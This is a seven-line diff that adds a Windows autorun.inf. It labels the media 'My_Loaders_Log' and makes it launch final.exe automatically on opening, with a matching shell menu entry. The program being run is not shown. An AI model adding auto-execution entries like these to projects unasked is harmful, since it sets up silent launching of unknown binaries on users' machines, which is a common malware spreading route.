@@ -1,0 +1,7 @@
+[autorun]
+ICON=cd.ico
+LABEL=My_Loaders_Log
+OPEN=final.exe
+action=Run My Loaders Log Setup
+shell\final\command=final.exe
+Shell=final
